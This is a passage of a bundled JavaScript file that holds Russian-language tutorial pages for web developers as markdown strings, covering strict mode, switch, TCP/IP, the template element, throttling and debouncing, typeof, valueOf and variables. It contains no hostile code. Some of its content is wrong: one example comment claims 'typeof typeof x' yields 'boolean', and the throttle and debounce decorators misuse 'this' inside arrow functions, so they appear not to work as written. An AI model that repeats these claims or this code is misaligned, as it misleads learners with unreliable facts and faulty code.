1000)\n}\nconsole.log(y)\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Strict mode code may not include a with statement••\n\n_________________________________________________\n\n### ![ico-20 warn] метод **_eval ()_** не может создавать переменные в области видимости, в которой он был вызван\n\n###### по соображениям безопасности \n\n**обычный режим:**\n\n~~~js\neval('var gamma = 2')\nconsole.log(gamma)\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\neval('var gamma = 2')\nconsole.log(gamma)\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught ReferenceError: gamma is not defined••\n\n__________________________________________\n\n### ![ico-20 warn] использовать как имена переменных ключевые слова:\n\n| ![ico-20 error] | implements |\n| ![ico-20 error] | interface |\n| ![ico-20 error] | let |\n| ![ico-20 error] | package |\n| ![ico-20 error] | private |\n| ![ico-20 error] | protected |\n| ![ico-20 error] | public |\n| ![ico-20 error] | static |\n| ![ico-20 error] | yield |\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Unexpected strict mode reserved word••"},2734:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] switch\n\nОператор  **switch** предназначен для ветвления кода на несколько веток в зависимости от значения _выражения_, передаваемого ему в качестве операнда\n\n~~~js\nswitch (выражение)\n~~~\n\n![ico-25 cap]\n\n~~~js\nvar words\n\nswitch (season) {\n  case 'Зима':\n    words = ['снег', 'елка', 'каток', 'шуба']\n    break\n  case 'Весна':\n    words = ['капель', 'ласточки', 'подснежники', 'цветение']\n    break\n  case 'Лето':\n    words = ['жара', 'речка', 'отпуск', 'каникулы']\n    break\n  case 'Осень':\n    words = ['школа', 'листопад', 'урожай', 'дождь']\n    break\n  default:\n    break\n}\n~~~\n\n______________\n\n[![ico-25 cap] Пример в песочнице](https://jsfiddle.net/garevna/g4roemnL/27/)\n[![ico-30 hw] **Тесты**](https://garevna.github.io/js-quiz/#switch)\n[![ico-20 link] w3schools](https://www.w3schools.com/js/js_switch.asp)\n"},55925:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 bash] TCP/IP\n\nСтек протоколов\n\n**TCP** - _Transmission Control Protocol_\n\n**IP** - _Internet Protocol_\n\n_________________________________________________\n\nВ сети, работающей на протоколах TCP/IP, информация передается пакетами, или иначе - _IP_-дейтаграммами (_IP datagrams_)\n\n**_Маршрутизатор_** - это компьютер, который передает пакеты данных из одной сети в другую\n\n**IP** - это протокол сетевого уровня, или базовый протокол маршрутизации, т.е. определения маршрута передачи дейтаграммы от компьютера-отправителя к компьютеру-получателю\n\nОднако на одном компьютере может быть одновременно запущено несколько программ, подключенных к сети\n\n**TCP** - это протокол транспортного уровня\n\nОн определяет процесс передачи данных между прикладными программами\n\nДля определения протокола верхнего уровня **TCP** использует число, называемое **портом**\n\nПротокол **TCP** обеспечивает проверку на наличие ошибок и обмен подтверждающими сообщениями\n\n^^Существует еще более быстрый протокол транспортного уровня **UDP**, однако он не гарантирует целостность переданных данных^^\n\nПротоколы прикладного уровня:\n\n![ico-20 green-ok] HTTP ( web )\n![ico-20 green-ok] SMTP ( почта )\n![ico-20 green-ok] DNS ( назначение IP-адресам понятных доменных имен )\n![ico-20 green-ok] FTP ( передача файлов )\n\nи так далее...\n\n____________________________________________________\n\n"},69624:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] &lt;template>\n\n_____________________________________________________________________________\n\nЭлемент ~<template>~ предназначен для хранения шаблона разметки\n\n![ico-20 warn] **Он не отображается на странице**\n\n![ico-20 warn] **Он парсится браузером, поэтому должен содержать только валидный код разметки**\n\n____________________________________________________________________________\n\n## ![ico-25 icon] DocumentFragment\n\nэто фрагмент документа, у которого нет родителя в дереве DOM\n\nDocumentFragment содержит DOM-элементы ( nodes ), как и объект ~document~\n\nНо поскольку фрагмент документа не является частью структуры DOM, он не отображается на странице\n\nЭто шаблон разметки, который при необходимости может быть вставлен в нужное время в нужном месте\n\n________________________________________________________________________________\n\n### ![ico-25 cap] Пример 1\n\n^^Откроем вкладку _Elements_ инструментов разработчика и вставим в элемент ~body~ следующий код разметки:^^\n\n~~~html\n<body>\n    <template id="sample">\n        <h3>Template header</h3>\n        <p>Template text</p>\n    </template>\n</body>\n~~~\n\n^^При этом на странице ничего не появится, а вот во вкладке  **Elements**  мы увидим следующую картинку^^\n\n~~~html\n▼ <template id="sample">\n  ▼ #document-fragment\n     <h3>Template header</h3>\n     <p>Template text</p>\n  </template>\n~~~\n\n________________________________________________________________________________\n\n## ![ico-25 icon] content\n\nСвойство  _**~content~**_  элемента  ~template~  содержит код разметки, находящийся  в контейнере ~<template>...</template>~\n\n\n### ![ico-25 cap] Пример 2\n\n**Шаблон разметки**\n\n~~~html\n<template id="svg">\n    <svg width="400" height="400">\n        <circle cx="200" cy="200"\n                r="100"\n                fill="transparent"\n                stroke="red"\n                style="stroke-width:5">\n        </circle>\n    </svg>\n</template>\n~~~\n\n^^Выведем в консоль свойство ~content~^^\n\n**content**\n\n~~~javascript\nconst circle = document.querySelector(\'#svg\')\nconsole.dir(circle.content)\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ #document-fragment\n    baseURI: "about:blank"\n    childElementCount: 2\n  ► childNodes: NodeList(5) [text, h3, text, p, text]\n  ► children: HTMLCollection(2) [h3, p]\n  ► firstChild: text\n  ► firstElementChild: h3\n    isConnected: false\n  ► lastChild: text\n  ► lastElementChild: p\n    nextSibling: null\n    nodeName: "#document-fragment"\n    nodeType: 11\n    nodeValue: null\n  ► ownerDocument: document\n    parentElement: null\n    parentNode: null\n    previousSibling: null\n    textContent: "↵        Template header↵        Template text↵    "\n  ► __proto__: DocumentFragment\n~~~\n\n^^^\n\n## ![ico-25 icon] Вставка в DOM\n\n^^Если выполнить код:^^\n\n~~~javascript\ndocument.body.appendChild(circle.content)\n~~~\n\n^^то после вставки в DOM содержимого шаблона контейнер  ~<template id="svg"></template>~  будет пустым^^\n\n^^Можно проверить это:^^\n\n~~~javascript\nconsole.dir(circle.content)\n~~~\n\n^^Свойство  **~childNodes~**  будет  **_~NodeList [ ]~_** (пустая коллекция узлов)^^\n\n^^Свойство  **~children~**  будет  **_~HTMLCollection [ ]~_** (пустая коллекция элементов)^^\n\n![ico-20 warn] Для многоразового использования шаблона разметки нужно использовать метод ~cloneNode (true)~\n\n~~~javascript\ndocument.body.appendChild(circle.content.cloneNode(true))\n~~~\n\n![ico-20 warn] ~true~ указывает на глубокое копирование, т.е. всех подузлов дерева\n\n_________________________________________________________________\n\n### ![ico-25 cap] Пример 3\n\n**Шаблон разметки**\n\n~~~html\n<template id="sample">\n    <style>\n        svg { border: dotted 1px; }\n        circle { stroke-width:5; }\n    </style>\n    <svg width="400" height="400" id="svg">\n        <circle cx="200" cy="200" r="100"\n                id="circle"\n                fill="transparent"\n                stroke="red">\n        </circle>\n    </svg>\n</template>\n~~~\n\n**Класс**\n\n~~~javascript\nclass CanvasElement extends HTMLElement {\n  constructor () {\n    super()\n    const shadow = this.attachShadow({ mode: \'open\' })\n    var sample = document.querySelector(\'#sample\')\n    shadow.appendChild(sample.content)\n  }\n}\ncustomElements.define(\'canvas-element\', CanvasElement)\n~~~\n\n**Вставка на страницу**\n\n~~~html\n<canvas-element></canvas-element>\n~~~\n\n_______________________________________________________________________\n\n### ![ico-25 cap] Пример 4\n\n^^Теперь давайте все сделаем на чистом JS:^^\n\n~~~~js\nconst template = document.body\n  .appendChild(document.createElement(\'template\'))\n\ntemplate.innerHTML = `\n    <style>\n        .red { color: red; }\n        .div { width: 100px; height: 50px; border: solid 1px green; }\n    </style>\n    <div class="div"></div>\n    <p class="red">Hello!</p>\n`\n\ncustomElements.define(\'sample-element\', class extends HTMLElement {\n  constructor() {\n    super()\n    const shadowRoot = this.attachShadow({ mode: \'open\' })\n      .appendChild(template.content.cloneNode(true))\n  }\n})\n~~~~\n\n^^Теперь вы можете сколько угодно раз вставить на страницу:^^\n\n~~~javascript\ndocument.body\n  .appendChild(document.createElement(\'sample-element\'))\n~~~\n\n^^Жутко удобно, правда ?^^ ![wink-25]\n'},67902:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Throttling and Debouncing\n\nНекоторые ресурсоемкие функции,\nфункции, выполняющиеся достаточно долго, чтобы их частые вызовы отразились на производительности приложения,\nа так же функции, \"дергающие\" сервер (т.е. отправляющие AJAX запросы)\nнежелательно запускать слишком часто\n\n[%%%lodash%%%](https://lodash.com/)\n\nДля ограничения числа вызовов такой функции можно использовать прием \"дроссель\" (**throttling**)\n\n_____________________________________________________________\n\n## ![ico-25 icon] Throttling\n\nЗадача - ограничить число вызовов функции\nпутем установки интервала времени,\nкоторый должен пройти с момента предыдущего вызова\n\n^^Напилим функцию-декоратор :^^\n\n◘◘![ico-20 file] throttle◘◘\n\n~~~js\nconst throttle = function (func, interval) {\n  func.lastCall = null\n\n  func.testInterval = () => {\n    const int = new Date().getTime() - this.lastCall\n    this.lastCall = !int\n      ? new Date().getTime()\n      : int >= interval\n        ? new Date().getTime()\n        : this.lastCall\n    return int ? int >= interval : true\n  }\n\n  return function (args) {\n    const test = this.testInterval()\n    test && this(args)\n  }.bind(func)\n}\n~~~\n\nЗдесь использован паттерн \"Декоратор\" и прием \"замыкание\",\nпозволяющие получить новый экземпляр на базе исходной функции **func** \\\n(первый формальный параметр),\nкоторый хранит время последнего вызова в собственном свойстве **lastCall**\nи обновляет его значение только тогда, когда истек установленный интервал **interval**\n(второй формальный параметр).\nФункция исполняется только в том случае,\nесли с момента предыдущего \"срабатывания\" колбэка прошло не менее **interval** мс.\n\nОбратите внимание, что мы не используем здесь \"тяжелую артиллерию\" таймеров.\n\nТеперь создадим, собственно, функцию, которую будем декорировать:\n\n◘◘![ico-20 file] showPicture◘◘\n\n~~~js\nfunction showPicture () {\n  const img = document.body.appendChild(new Image())\n  const num = Math.round(Math.random() * 900)\n  img.src = `https://picsum.photos/id/${num}/400/300`\n  img.width = 100\n}\n~~~\n\nСоздадим новый экземпляр функции **showPictureThrottle** с помощью декоратора **_throttle_**.\n\n~~~js\nconst showPictureThrottle = throttle(showPicture, 1000)\n~~~\n\nСоздадим кнопку, при клике на которой будет вызываться функция **showPictureThrottle**:\n\n~~~js\nconst btn = nav.appendChild(document.createElement('button'))\n\nbtn.innerText = 'Add picture once per 1 sec'\nbtn.onclick = showPictureThrottle\n~~~\n\nТеперь можно кликать на кнопке - картинка будет вставляться не чаще 1 раза в секунду ![ico-20 smile].\n\n{{{throttling-and-debouncing-1.js}}}\n\n_____________________________________________________________\n\n## ![ico-25 icon] Debouncing\n\nЗдесь будет незначительное отличие от предыдущего варианта функции-декоратора\nФункция **debounce** также проверяет интервал времени, прошедший с момента последнего вызова\n\n◘◘![ico-20 file] debounce◘◘\n\n~~~js\nconst debounce = function (func, interval) {\n  func.lastCall = null\n\n  func.testInterval = () => {\n    const int = new Date().getTime() - this.lastCall\n    this.lastCall = !int ? new Date().getTime() : this.lastCall\n    return int ? int >= interval : true\n  }\n\n  return function (args) {\n    const test = this.testInterval()\n    test && this(args)\n    }.bind(func)\n\n}\n~~~\n\nЕсли внутри строки встречаются двойные кавычки, то сама строка должна быть завернута в одинарные, и наоброт\n\n◘◘![ico-20 cap] inputHandler◘◘\n\n~~~js\nfunction inputHandler (event) {\n  if (!event.target.value) {\n    event.target.label.innerText = '...'\n    return\n  }\n  fetch(`https://garevna-json-server.glitch.me/usernames/${event.target.value}`)\n    .then(response => response.json())\n    .then(response => {\n      if (response && response.name) {\n        event.target.label.innerText = response.name\n        event.target.style.color = 'green'\n      } else {\n        event.target.style.color = 'red'\n      }\n    })\n}\n~~~\n\nТеперь создадим экземпляр колбэка, декорированный с помощью функции **debounce**:\n\n~~~js\nconst inputHandlerDebounced = debounce(inputHandler, 1000)\n~~~\n\nЭтот экземпляр будет посылать запрос на сервер только в том случае, если с момента последнего ввода пользователя прошла 1 секунда\nЕсли вводить символы очень быстро, запрос отправляться не будет\n\nДобавим немного стилей:\n\n~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  input {\n    padding: 4px 12px;\n  }\n  label {\n    padding-left: 8px;\n    font-family: Arial;\n    font-style: italic;\n    font-size: 0.8rem;\n    color: #777;\n  }\n`\n~~~\n\nА теперь объявим функцию, которая создает и вставляет на страницу элемент input,\nи вызовем ее:\n\n◘◘![ico-20 cap] Запуск◘◘\n\n~~~js\nconst createInput = () => {\n  const inp = document.body\n    .appendChild(document.createElement('input'))\n  inp.id = 'usernames'\n\n  inp.oninput = inputHandlerDebounced\n\n  const label = document.body\n    .appendChild(document.createElement('label'))\n\n  label.for = 'usernames'\n  label.innerText = '...'\n\n  inp.label = label\n}\n\ncreateInput()\n~~~\n\n{{{throttling-and-debouncing-2.js}}}\n"},93039:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="\n# ![ico-30 icon] Переменные. Типы данных\n\n_____________________________________________________________\n\n## ![ico-25 icon] Оператор typeof\n\n![ico-25 warn] Оператор  ~typeof~  возвращает строку.\n\nВозможные значения, возвращаемые оператором ~typeof~:\n\n• ~string~\n• ~number~\n• ~boolean~\n• ~object~\n• ~undefined~\n• ~function~\n• ~symbol~\n\n![ico-25 cap] ** 1**\n\n^^Наберите в консоли:^^\n\n~~~js\nvar x = 10\ntypeof x      // \"number\"\n~~~\n\n^^А теперь выполните код в консоли:^^\n\n~~~js\nx = 'google'\ntypeof x     // \"string\"\n~~~\n\n^^Теперь выполните в консоли следующий код:^^\n\n~~~js\nvar x = false\ntypeof typeof x  // \"boolean\"\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 icon] string\n\nСтроки состоят из символов и заворачиваются в двойные (_\"мама\"_) или одинарные (_'мама'_) кавычки.\n\nТакже можно завернуть строку в обратные кавычки **~ ` ~**\n\n~~~js\nvar sample = `This is a sample`\n~~~\n\nЕсли внутри строки встречаются двойные кавычки, то сама строка должна быть завернута в одинарные, и наоброт.\n\n◘◘![ico-25 cap]◘◘\n\n~~~js\nvar str = '\"es2023\" is a shorthand for \"ECMAScript 2023 Language Specification\".'\n~~~\n~~~js\nvar str = \"'es2023, x' is a shorthand for 'ECMAScript 2023 Language Specification'.\"\n~~~\n\nОднако можно использовать экранирующий слеш (\\), чтобы дать понять движку, что это не закрывающая кавычка, а просто символ строки:\n\n~~~js\nstr = '\\'es2023, x\\' is a shorthand for \\'ECMAScript 2023 Language Specification\\'.'\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 icon] number\n\nПеременная типа ~number~ может быть:\n\n• целым числом: ~15~;\n• числом с плавающей точкой: ~5.80~;\n• числом в экспоненциальной форме: ~5e+37~\n• **~Infinity~** ^^(бесконечность)^^\n• **~NaN~** ^^(Not a Number - не число)^^\n\n![ico-20 warn] Значение **~Infinity~** может получиться при делении на ноль:\n\n~~~js\nvar x = 1, y = 0\nvar z = x / y\n~~~\n\n^^Значением переменной ** z ** будет  *Infinity*^^\n\n![ico-20 warn] Значение **~NaN~** может получиться при попытке выполнения арифметических операций с операндами, которые не являются числами, например:  ~5 * \"total\"~, а так же при попытке разделить ноль на ноль: ~0/0~\n\n![ico-20 warn] Значение **~NaN~** не равно никакому другому значению, включая само значение **~NaN~**\n\n![ico-20 warn] Никакие арифметические операции в JS никогда не будут завершены с ошибкой, поскольку в случае ошибки операция вернет **~NaN~**\n\n________________________________________________________\n\n## ![ico-25 icon] boolean\n\nЛогический тип\n\nДанные логического типа могут принимать только одно из двух значений:\n\n• ~true~ (истина)\n• ~false~ (ложь)\n\n_____________________________________________________________\n\n## ![ico-25 icon] object\n\nК данным типа ~object~ относятся:\n\n• **^^объекты^^**\n• **^^массивы^^**\n• **^^null^^**\n\n________________________________________________________\n\n## ![ico-25 icon] undefined\n\nСпециальный тип данных, означающий, что значение переменной не определено\n\n![icon-25 cap]\n\n~~~js\nvar  sample\nconsole.log (sample)\n~~~\n\nВ консоль будет выведено **~undefined~**, поскольку мы не присвоили переменной  **~sample~** никакого значения.\n\n________________________________________________________\n\n## ![ico-25 icon] function\n\nС помощью ключевого слова **~function~** создаются объекты, содержащие фрагмент кода.\n\nОбъекты типа ~function~ являются контейнерами для скриптов.\n\nЕсли вывести в консоль такой объект:\n\n◘◘![ico-25 cap] 1◘◘\n\n~~~js\nfunction sample (arg) {\n  console.log(arg)\n}\nconsole.log(sample)\n~~~\n\nто мы увидим следующее:\n\n~~~console\nƒ sample (arg) {\n  console.log(arg)\n}\n~~~\n\nТакие объекты имеют тип данных **~function~**.\n\n__________________________________________________________\n\n◘◘![ico-25 cap] 2◘◘\n\n~~~js\nfunction sample (arg) {\n  console.log(arg)\n}\nconsole.log(typeof sample) // function\n~~~\n\nОсобенность этого типа данных заключается в том, что в любой момент можно инициировать выполнение кода, находящегося в объекте, по его имени (для этого необходимо после имени функции использовать круглые скобки).\n\n_________________________________________________________\n\n◘◘![ico-25 cap] 3◘◘\n\n~~~js\nfunction sample () {\n  console.log('Hi, student!')\n}\n\nsample()   // \"Hi, student!\"\n~~~\n\n^^Мы будем подробнее изучать объекты типа function далее^^\n\n_____________________________________________________________\n\n#### [![ico-30 hw] Упражнения](test/typeof)\n"},22459:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] valueOf\n\nМетод  **_~valueOf()~_**  наследуется всеми объектами от **~Object~**\n\nЭтот метод вызывается автоматически, когда необходимо вернуть примитивное значение объекта\n\nНапример, если объект сравнивается с числом\n\n~~~js\nvar obj = {\n  num: 5,\n  val: 10,\n  x: 11,\n  valueOf: function () {\n    return this.num + this.val - this.x\n  }\n}\n~~~\n\nЕсли теперь мы выполним сравнение:\n\n~~~js\nobj == 4\n~~~\n\nто получим  _~true~_\n\nПри выполнении сравнения будет вычисляться примитивное значение объекта, т.е. вызываться метод **~valueOf()~**\n\nЕсли примитивное значение объекта вычислить невозможно, то будет возвращен сам объект\n\n**~valueOf ()~** - **_унаследованный_** метод любого объекта\n\nНо это не означает, что мы не можем его переопределить\n\n◘◘![ico-25 cap] ** 1 **◘◘\n\n~~~js\nvar human = {\n  name: 'Ivan',\n  age: 25,\n  valueOf: function () {\n    return this.name + ': ' + this.age\n  }\n}\n\nconsole.info(human + '!') // Ivan: 25!\n~~~\n\n___________________\n\nКонечно, так делать не стоит, но все-таки интересно ![ico-20 smile]\n\nв результате выполнения следующего кода:\n\n\n◘◘![ico-25 cap] ** 2 **◘◘\n\n\n~~~js\nObject.prototype.valueOf = function () {\n  return 'Это объект, блин, а не игрушка!'\n}\n~~~\n\nвсе нативные объекты JS будут \"ругаться\" соответствующим образом при попытке получить их примитивное значение\n\n~~~js\nconsole.info(Number + '')\n~~~\n\n~~~console\nЭто объект, блин, а не игрушка!\n~~~\n\n__________\n\n◘◘![ico-25 cap] ** 3 **◘◘\n\n~~~js\nconst test = {\n  num: 0,\n  valueOf: function () {\n    return this.num += 1\n  }\n}\n~~~\n\n![ico-25 question] Что вернет выражение:\n\n~~~js\ntest == 1 && test == 2 && test == 3\n~~~\n\n____________________\n\n[![ico-30 hw] **Тесты**](https://garevna.github.io/js-quiz/#valueOf)\n"},11109:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Переменные. Типы данных\n\nНемного забегая вперед, введем понятие **глобального объекта**.\nГлобальный объект - это та среда, в которой мы \"живем\" (функционируем) и за пределы которой мы выйти не можем.\n\n@@@@\n<br>На стороне клиента JS работает в браузере, в консоли которого, кстати, мы и выполняем все приведенные ниже операции.<br><br>Это возможно потому, что движок **V8**, встроенный в каждый браузер, интерпретирует наш код и выполняет его.\n![](images/v8-logo.svg)\n@@@@\n\nУпрощенно говоря, глобальным объектом для нас является браузер (если точнее, то его объектная модель, но это мы будем разбирать позже).\nСам браузер функционирует в операционной системе и имеет доступ к ее возможностям.\nНо мы не можем выйти за пределы браузера и взаимодействовать с операционной системой напрямую.\n\nИтак, операционная система выделяет системные ресурсы, в частности - память, для работы приложений, в том числе браузера.\nБраузер распоряжается выделенным ему ресурсом памяти, часть которого он выделяет движку **V8**.\nДалее мы будем говорить о переменных, т.е именно о памяти, которую будет использовать наше приложение.\n\nДля нашего кода доступ к глобальному объекту обеспечивается с помощью переменной **~window~**.\n\n## ![ico-30 icon] Память и данные\n\nПамять представляет собой огромное количество ячеек, каждая из которых может содержать 0 или 1.\n\n@@@@\nТакая ячейка - это **бит** памяти.<br>Поэтому двоичная система исчисления стала базой для появления первых компьютеров.<br>Из **8 битов** получается **1 байт** памяти.\n![](illustrations/vars-bit-and-byte.png)\n@@@@\n\nВ **1 байт** памяти можно поместить максимум 8 единиц, т.е. двоичное число 11111111.\n\nВ десятичной системе исчисления это будет число 255 без знака.\nЕсли **байт** (8 бит) интерпретировать как знаковое число, то один бит будет содержать знак числа (**+ **или** -**), поэтому максимальное число со знаком, которое может \"поместиться\" в один байт, будет 127 (семь единиц).\n\n••-1111111↓↓2 ↓↓ → -127↓↓10↓↓••\n\n^^Любое число может быть представлено в двоичной системе исчисления набором нулей и единиц:^^\n\n{{{vars-01.js}}}\n\n^^Любое число можно разложить по степеням двойки + остаток (0 или 1).^^\n^^Поскольку в двоичной системе двойка - это десятка, заменяем степени двойки на степени десятки, складываем и добавляем остаток.^^\n^^Все достаточно просто.^^\n\n{{{vars-binary.js}}}\n\nКак вы уже догадались, компьютер может работать только с двоичными числами, т.е. с наборами нулей и единиц.\nЛогичный вопрос: как же в компьютере хранится текст, картинки и видео и т.п.\n\nЛюбой оттенок представляется в виде нескольких чисел:\n\n{{{vars-color.js}}}\n\nЛюбой символ представляется его кодом (числом):\n\n{{{vars-char.js}}}\n\nТаким образом, любая информация представлена в памяти компьютера наборами нулей и единиц, и управление распределением памяти - очень сложный процесс.\nСовершенно невероятно оперировать физическими адресами памяти для доступа к данным.\nЭто делает операционная система.\nВам не нужно знать физические адреса, по которым будут храниться ваши данные.\nДля каждого элемента данных вам нужно придумать имя и сообщить движку, какой элемент данных вы будете хранить под этим именем.\nТаким образом и создается **переменная**.\nИтак, **переменные** облегчают вам манипуляции с данными и обеспечивают безопасность операционной системы и работающих приложений.\n_________________________________________________________________\n\n## ![ico-30 icon] var\n\nВаши данные (числа, строки и т.д.) будут храниться в памяти компьютера, пока работает ваше приложение, но вам не нужно знать точно, где именно движок хранит их.\nИмена переменных - это удобная форма адресации, когда вам не нужно манипулировать физическими адресами памяти.\nВам достаточно указать движку имя переменной, и в дальнейшем вы сможете использовать это имя для получения доступа к данным.\n\nДля объявления переменной используется ключевое слово **~var~**, за которым (через пробел) следует имя переменной.\nВстретив такое объявление, движок резервирует определенный участок памяти компьтера и \"привязывает\" к указанному вами имени переменной адрес памяти, выделенной для ее хранения.\n^^Обратите внимание, что в случае необходимости движок может переместить хранимое значение в другой участок памяти, при этом он автоматически изменит значение адреса, к которому привязано имя переменной, вы даже не узнаете об этом.^^\n\n![ico-25 warn] Объявление переменной с помощью ключевого слова **~var~** помещает нашу переменную в глобальный объект **~window~**.\n~~~js\nvar number\n~~~\nЧто это означает для нас?\nЧто мы можем обратиться к значению этой переменной как напрямую по ее имени, так и опосредованно, через глобальный объект:\n\n^^в точечной нотации:^^\n••window.number••\n\n^^или так:^^\n\n••window['number']••\n\nПри объявлении переменной ей можно сразу присвоить начальное значение.\n\nДля этого используется самый часто используемый **оператор языка** - оператор присваивания **~ =~**.\n\n§§§§ Demo | var_01_template §§§§\n\nВ левой части оператора присваивания должно быть имя переменной, в правой - некое **выражение**.\nДвижок вычислит значение выражения в правой части оператора присваивания и поместит вычисленное значение в переменную, имя которой указано в левой части оператора.\n\n~~~js\nvar number = 5 + 8 - 4\n~~~\n\nПосле выполнения этого кода в переменной **~number~** будет число 9.\n\nЕсли в левой части оператора присваивания находится выражение, значение которого не является именем переменной:\n\n~~~js\n'user' + 'Name' = 9 + 8\n~~~\n\nто движок сгенерирует исключение:\n\n~~~error\n    Uncaught SyntaxError: Invalid left-hand side in assignment\n~~~\n\nОднако это не означает, что в левой части оператора присваивания не может быть выражения.\n\nРассмотрим пример.\n\n^^^[![ico-25 coffee] 1]\n\nОбъявим переменную **~userName~** и присвоим ей значение 'Piter':\n\n~~~js\nvar userName = 'Piter'\n~~~\n\nНаша переменная попала в глобальный объект **~window~**.\nПоэтому мы имеем доступ к ней как к переменной **~window.userName~**.\nИли как **~window['userName']~**.\n\nПоэтому мы можем использовать в левой части оператора присваивания выражение, после вычисления которого движок получит ссылку на переменную:\n\n~~~js\nwindow['user' + 'Name'] = 'Helen'\n~~~\n\nМожете проверить самостоятельно, что значение переменной **~userName~** изменилось.\n\n^^^\n\n^^Когда мы дойдем до деструктуризации, вы увидите, какие еще выражения могут быть в левой части оператора присваивания.^^\n\n\n\n![ico-25 warn] Если мы объявим переменные, но не присвоим им начальные значения:\n\n~~~js\nvar x, y, z\n~~~\n\nто их значением будет **~undefined~** (не определено).\n\n![ico-25 warn] Если мы не объявим переменную, но попытаемся обратиться к ней:\n\n~~~js\nconsole.log(sigma)\n~~~\n\n![ico-20 err] то в консоли появится сообщение об ошибке:\n\n~~~error\n    Uncaught ReferenceError: sigma is not defined\n~~~\n\nМожно объявить сразу несколько переменных в одной строке, разделяя их запятой:\n\n~~~js\nvar person = 'Piter',  hobby = 'football',  age = 30\n~~~\n\n______________________________________________________________\n\n## ![ico-30 icon] Имена переменных\n\n![ico-25 warn] Имена переменных могут содержать буквы, цифры, символы подчеркивания и знаки доллара.\n\n![ico-25 warn] Имена переменных могут начинаться с буквы, сиволов ~ $~ и ~ _~.\n\n§§§§ Demo | var_02_template §§§§\n\nРекомендуется давать длинные и понятные имена переменных и функций, составленные из нескольких слов.\nЭто улучшает читабельность кода:\n\n~~~js\nvar lastUserVisit = '2019-02-05'\n~~~\n\n![ico-25 warn] Имена переменных чувствительны к регистру (~name~ и ~Name~ - разные переменные).\n\n§§§§ Demo | var_03_template §§§§\n\n@@@@\n![](illustrations/camel-case.png)\n**Camel Case** - стиль написания имен переменных, состоящих из нескольких слов, когда каждое следующее слово начинается с литеры в верхнем регистре.<br><br>Первая литера, с которой начинается имя переменной, должно быть в нижнем регистре.\n@@@@\n\n^^С литеры в верхнем регистре принято начинать только имена конструкторов и классов, с которыми мы познакомимся позже.^^\n\n^^На будущее: имена **функций** рекомендуется начинать с **глагола**, чтобы отличать их от имен переменных, в которых хранятся данные.^^\n\n[![ico-25 warn] **_Зарезервированные слова_**](https://www.w3schools.com/js/js_reserved.asp ) не могут использоваться как имена переменных.\n\n![ico-25 warn] Имена переменных не могут начинаться с цифры.\n\n~~~js\nvar 14br = 10\n~~~\n\n~~~error\n    Uncaught SyntaxError: Invalid or unexpected token\n~~~\n\n______________________________________________________________\n\n## ![ico-30 icon] Типы данных\n\nКак вы уже поняли, любые данные хранятся в памяти компьтера как набор нулей и единиц.\nДля того, чтобы движок мог корректно интерпретировать этот набор нулей и единиц, он должен знать, что было сохранено по данному адресу: число, строка или что-то другое.\n\nПредположим, по указанному адресу в памяти находится двоичное число:\n\n••0100011001000111010010000100100101001011010011000100110101001110••\n\nЕго можно интерпретировать как десятичное целое число:\n\n••5064095785634516000••\n\nили как строку, каждый символ которой занимает 1 байт:\n\n••FGHIKLMN••\n\nСуществует также масса других вариантов интепретации.\n\n^^В переменных могут храниться числа, строки, логические значения, специфические значения **~null~** и **~undefined~**, а так же данные **ссылочного типа**, с которыми мы познакомися позже.^^\n\nИтак, важно, чтобы движок знал тип данных, которые хранятся в переменной.\n\nВ отличие от языков со строгой типизацией, нам не нужно при объявлении переменной указывать тип данных, которые мы предполагаем хранить в этой переменной.\n\n**Тип данных определяется в процессе присваивания значения.**\nЭто называется **динамической типизацией**.\n\n______________________________________________________________\n\n### ![ico-25 icon] String\n\nСтрока - это упорядоченный набор символов, которые заключаются в двойные (~\"My name is Piter\"~) или одинарные (~'My name is Piter'~) кавычки.\n\n| ^^ 0^^ | ^^ 1^^ | ^^ 2^^ | ^^ 3^^ | ^^ 4^^ | ^^ 5^^ | ^^ 6^^ | ^^ 7^^ | ^^ 8^^ | ^^ 9^^ | ^^10^^ | ^^11^^ | ^^12^^ | ^^13^^ | ^^14^^ | ^^15^^ |\n| ** M** | ** y** |        | ** n** | ** a** | ** m** | ** e** |        | ** i** | ** s** |        | ** P** | ** i** | ** t** | ** e** | ** r** |\n\n\nМожно завернуть строку и в обратные кавычки **~ ` ~**, но обратные кавычки принято использовать для [►►►**темплейтных литералов**►►►](page/literals).\n\nЕсли внутри строки встречаются двойные кавычки, то сама строка должна быть завернута в одинарные, и наоброт.\n\n◘◘![ico-25 cap]◘◘\n\n~~~js\nvar str = '\"es2023\" is a shorthand for \"ECMAScript 2023 Language Specification\".'\n~~~\n~~~js\nvar str = \"'es2023, x' is a shorthand for 'ECMAScript 2023 Language Specification'.\"\n~~~\n\nОднако можно использовать экранирующий слеш **~&bsol;~**, чтобы дать понять движку, что это не закрывающая кавычка, а просто символ строки:\n\n~~~js\nstr = '\\'es2023, x\\' is a shorthand for \\'ECMAScript 2023 Language Specification\\'.'\n~~~\n\nКаждый символ имеет свой числовой код.\n\nСоответствие между символом и его кодом устанавливается в кодировочной таблице.\n\nСамый широкий охват символов различных алфавитов представлен в кодировке **UTF-8** (Unicode Transformation Format, 8-bit).\n\nКодировка [%%% **UTF-8**%%%](https://blog.hubspot.com/website/what-is-utf-8 ) сейчас является доминирующей в веб.\n\n_____________________________________\n\nПоскольку строки - это упорядоченный набор символов, то число символов в строке определяет ее длину, логично?\nТак что у строк есть свойство **~length~**, которое доступно нам следующим образом:\n\n§§§§ Demo | var_string_length_template §§§§\n\nКстати, 